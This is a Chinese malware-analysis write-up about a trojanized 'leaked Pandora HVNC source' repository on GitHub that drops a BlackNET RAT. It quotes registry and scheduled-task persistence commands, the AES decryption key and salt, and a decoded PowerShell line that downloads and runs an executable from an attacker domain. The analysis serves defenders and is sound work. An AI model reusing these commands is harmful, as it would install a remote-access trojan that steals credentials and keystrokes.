## 起因

网上冲浪的时候，看到篇帖子说Pandora
Hvnc的源码泄露了，于是去github上一搜发现一堆疑似源码的仓库，并且大多数都有十个以上的start，愉快的clone下来，发现Hidden Vnc
Full Not pasted.sln的文件杀软报毒了。类型是屏幕保护程序，图标也不太对劲，于是对其分析一波。

![](https://image.3001.net/images/20221018/1666056680_634e01e8016ff6bac00c8.png!small)

## 前置程序分析

### 一级程序

通过分析知道，此程序的后缀为scr，但用了FileSpoofer技术显示了假的扩展名(详见参考链接1)。

拖入die，显示为.net程序。![](https://image.3001.net/images/20221018/1666057258_634e042a67be6b3cee5e5.png!small)

拖入dnspy，程序被简单混淆，直接使用de4dot反混淆后再次打开，其中Main函数:

![](https://image.3001.net/images/20221018/1666057297_634e0451e4959afc2091c.png!small)全部字符串进行base64加密，进行动态调试分析：

Class0.smethod_3():![](https://image.3001.net/images/20221018/1666057339_634e047b71755abf8b9b2.png!small)

首先判断程序是否为C:\Users\xxxxx\AppData\Roaming\WindowsDefenderScreen\WindowsDefenderScreen.exe，如果不是则创建相关路径，关闭相关程序并复制文件到此目录。

然后运行PowerShell命令进行开机启动设置：

    
    
    "Remove -ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderScreen';New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderScreen' -Value '""C:\Users\xxxxx\AppData\Roaming\WindowsDefenderScreen\WindowsDefenderScreen.exe""' -PropertyType 'String'"

判断是否为Administrator权限，根据权限不同，利用任务计划进行权限维持

    
    
    是Administrator权限:
    cmd /C schtasks /create /tn \WindowsDefenderScreen /tr "C:\Users\xxxxx\AppData\Roaming\WindowsDefenderScreen\WindowsDefenderScreen.exe" /st 00:00 /du 9999:59 /sc once /ri 60 /rl HIGHEST /f
    
    非Administrator权限:
    cmd /C schtasks /create /tn \WindowsDefenderScreen /tr "C:\Users\xxxxx\AppData\Roaming\WindowsDefenderScreen\WindowsDefenderScreen.exe" /st 00:00 /du 9999:59 /sc once /ri 60 /f

接下来进入正常执行流程：

首先通过GetManifestResourceStream获取rZJsQDE9Fv的资源文件，然后对资源文件进行解密，

用的AES算法，其中密钥为zEP2yn51xz，salt为{26,20,202,234,136,123,69,47}，模式为CBC，具体可以看下图：

![](https://image.3001.net/images/20221018/1666057681_634e05d1913be80332712.png!small)解密后会通过注入到C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe运行，这里直接将解密数据提取分析。

### 二级程序

上面提取出来的程序如下：

![](https://image.3001.net/images/20221018/1666057728_634e06002753157fb87c1.png!small)此程序主要是通过ShellExecuteA与EnumResourceNamesA释放并打开  
C:\Users\xxxxx\AppData\Roaming\HYPERVISOR.SLN与C:\Users\xxxxx\AppData\Roaming\WINDOWSDEFENDERSCREEN.EXE造成是正常Visual
Studio工程的假象。

![](https://image.3001.net/images/20221018/1666057805_634e064d8cc200b39c6ee.png!small)

### 三级与四级

二级程序释放的新的WINDOWSDEFENDERSCREEN.EXE是一个.net程序，程序逻辑和第一个.net程序完全一样只是资源文件变了，提取出四级程序，和二级程序一样释放资源文件这次一共释放了10个.net文件：

![](https://image.3001.net/images/20221018/1666057888_634e06a030ae63bd539ec.png!small)每个文件都是使用PowerShell运行base64编码后的代码，以BLACK.exe为例：

![](https://image.3001.net/images/20221018/1666057910_634e06b694a168aaf6d4d.png!small)解码后代码：

    
    
    <#ytg#>Start-Sleep -Seconds 10;(New-Object System.Net.WebClient).DownloadFile('https://zenginlerclubmuck.xyz/DontDelete/Blacknet/l/blacknet%20L.exe', <#gan#> (Join-Path <#iya#> -Path $env:AppData <#gqq#> -ChildPath 'Black.exe'))<#gld#>; Start-Process -FilePath <#jce#> (Join-Path -Path $env:AppData <#xtl#> -ChildPath 'Black.exe')<#ews#>

通过网络下载远控程序。

前置程序利用了大量的程序间调用，意图躲避杀软：

![](https://image.3001.net/images/20221018/1666058027_634e072b3390f950e082b.png!small)

## 远控程序分析

zenginlerclubmuck.xyz的网站已经连接不上了，只能查到相关缓存。

![](https://image.3001.net/images/20221018/1666058067_634e0753b41e188b4d424.png!small)

通过一顿查找找到了https://zenginlerclubmuck.xyz/DontDelete/Blacknet/p/black P.exe的文件缓存。

![](https://image.3001.net/images/20221018/1666058099_634e0773521c0674e2f99.png!small)又是一个.net程序，de4dot能识别为Babel.Net但无法反混淆，在dnspy中查看类型引用，发现GZipStream，猜测用来解压缩Payload，便在此处下断点进行动态调试，在断点处停止后，代码已经出来了。

![](https://image.3001.net/images/20221018/1666058148_634e07a4527a50f5a8f43.png!small)这里CheckFile
是将文件放在C:\Users\xxxxxx\AppData\Roaming\Windows Security\Windows Security.exe
并添加开机自启。

后面通过Gzip解压缩Payload，直接提取rawAssembly与array3，主要恶意程序在array3中。

![](https://image.3001.net/images/20221018/1666058196_634e07d4dde194e936efa.png!small)可以知道这个程序包括了虚拟机判断，屏幕截图，键盘记录，凭据窃取，DDOS等功能。

通过对其特征判断，很明显这是基于BlackNET RAT制作恶意程序，对详细技术感兴趣的可以去看参考链接中的2，3。

## 参考链接

> <https://github.com/henriksb/ExtensionSpoofer>
>
> <https://labs.k7computing.com/index.php/dark-side-of-blacknet-rat/>
>
> [https://labs.k7computing.com/index.php/dark-side-of-blacknet-rat-> part-2/﻿](https://labs.k7computing.com/index.php/dark-side-of-blacknet-rat-> part-2/)

